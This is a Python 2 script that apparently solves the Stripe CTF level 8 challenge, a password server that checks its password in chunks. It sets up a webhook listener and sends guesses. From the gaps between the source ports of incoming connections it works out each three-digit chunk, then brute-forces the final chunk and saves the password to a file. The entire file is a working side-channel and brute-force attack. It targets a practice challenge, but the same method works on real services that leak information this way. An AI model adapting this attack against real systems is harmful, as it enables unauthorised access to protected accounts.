import httplib
import json
import socket
import random
import time

WEBHOOK_HOST = 'level02-4.stripe-ctf.com%s'
WEBHOOK_BIND = '10.0.1.136'
PASSWORDDB_ADDR = 'level08-2.stripe-ctf.com'
PASSWORDDB_PATH = '/user-mkxmeeotwo/'

#PDELTA_TOLERANCE_LIMIT = 1000

chunks = ['000', '000', '000', '000']

def zero_pad_string(strnum):
    while len(strnum) < 3:
        strnum = "0%s" % strnum
    return strnum

def is_even(num):
    return num % 2 == 0

def get_password(override_index=None, override_chunk=None):
    if override_index is not None:
        chunks[override_index] = override_chunk
    return "".join(map(str, chunks))

def do_request(sock, payload):
    conn = httplib.HTTPSConnection(PASSWORDDB_ADDR)
    conn.request('POST', PASSWORDDB_PATH, payload)
    # resp = conn.getresponse()
    # if "true" in resp.read():
    #     print "WINRAR!!! %s" % password
    conn.close()
    client, address = sock.accept()
    port = address[1]
    client.close()

    return port

def bind_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    breakout = False
    while not breakout:
        try:
            webhook_port = random.randrange(1025, 65534)
            s.bind((WEBHOOK_BIND, webhook_port))
            #print "bound to %s" % webhook_port
            breakout = True
        except Exception, e:
            print e
            print "webhook bind to %s failed. retrying." % webhook_port
            """ lol """ 
    s.listen(5)
    return s

def construct_payload(password, port):
    hookurl = "%s" % WEBHOOK_HOST
    hookurl = hookurl % (":" + str(port))
    return json.dumps({"password": password, "webhooks": [hookurl]})

def get_possible_matches(chunk_index, setrange, socket1):
    possible = []

    for i in setrange:
        password = get_password(chunk_index, zero_pad_string(str(i)))
        print "trying %s" % password
        two = 999999999
        one = 0
        payload1 = construct_payload(password, socket1.getsockname()[1])
        #payload2 = construct_payload(password, socket2.getsockname()[1])
        while (two - one) > (chunk_index + 3) or (two < one) or (two == one):
            #zerotime = time.time()
            one = do_request(socket1, payload1)
            #onetime = time.time()
            two = do_request(socket1, payload1)
            #twotime = time.time()
            #latency = twotime - onetime
            diff = two - one
            #print "latency1: %s" % (onetime - zerotime)
            #print "latency2: %s, diff: %s" % (latency, diff)

        if (chunk_index + 3) == diff:
            possible.append(i)
            print "possible chunk '%s' @diff=%s" % (i, diff)

        # #if is_even(chunk_index):
        #     #if not is_even(diff):
        #         possible.append(i)
        #         print "possible chunk '%s' @diff=%s" % (i, diff)
        # else:
        #     #if is_even(diff):
        #         possible.append(i)
        #         print "possible chunk '%s' @diff=%s" % (i, diff)

    return possible

s1 = bind_socket()
#s2 = bind_socket()

for ci in range(0, 3):
    print "searching for chunk %s" % (ci + 1)
    matches = range(0, 1000)
    pass_num = 1
    while len(matches) > 1:
        print "beginning pass %s" % pass_num
        matches = get_possible_matches(ci, matches, s1)
        pass_num = pass_num + 1
    with open("chunks.txt", "a") as myfile:
        myfile.write("chunk %s is %s. \n" % ((ci + 1), zero_pad_string(str(matches[0]))))
    print "chunk %s verified as %s" % ((ci + 1), zero_pad_string(str(matches[0])))
    chunks[ci] = matches[0]

print "attempting to verify final chunk"
for i in range(0, 1000):
    password = get_password(3, zero_pad_string(str(i)))
    print "trying %s" % password
    conn = httplib.HTTPSConnection(PASSWORDDB_ADDR)
    conn.request('POST', PASSWORDDB_PATH, json.dumps({"password": password, "webhooks": []}))
    resp = conn.getresponse()
    restext = resp.read()
    if "true" in restext:
        print "WINRAR!!! %s" % password
        print "WINRAR!!! %s" % password
        print "WINRAR!!! %s" % password
        print "WINRAR!!! %s" % password
        print "WINRAR!!! %s" % password
        print "WINRAR!!! %s" % password
        print "WINRAR!!! %s" % password
        print "WINRAR!!! %s" % password
        print "WINRAR!!! %s" % password
        print "WINRAR!!! %s" % password
        f = open('password.txt', 'w')
        f.write(password)
        f.close()
        exit()
    conn.close()